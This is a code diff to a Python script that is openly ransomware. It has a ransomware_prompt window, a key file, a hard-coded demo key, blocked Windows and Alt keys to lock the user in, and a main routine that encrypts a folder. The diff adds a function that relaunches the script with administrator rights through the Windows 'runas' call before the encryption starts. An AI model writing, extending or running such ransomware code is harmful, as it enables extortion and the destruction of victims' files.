@@ -1,3 +1,5 @@
+import sys
+import ctypes
 import os
 import tkinter as tk
 from tkinter import messagebox
@@ -14,6 +16,15 @@ KEY_FILE = "encryption.key"
 blocked_keys = ['left windows', 'right windows', 'alt', 'alt gr']
 
 DEMO_KEY = "1234ABCD"
+
+def run_as_admin():
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        print("Requesting admin privileges...")
+        script = os.path.abspath(sys.argv[0])
+        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
+        # Relaunch with admin
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
+        sys.exit()
 
 def generate_key():
     """
@@ -116,6 +127,8 @@ def ransomware_prompt():
     window.mainloop()
 
 if __name__ == "__main__":
+    run_as_admin()
+    
     while not os.path.exists(KEY_FILE):
         generate_key()
     encrypt_folder(FOLDER_PATH, load_key())
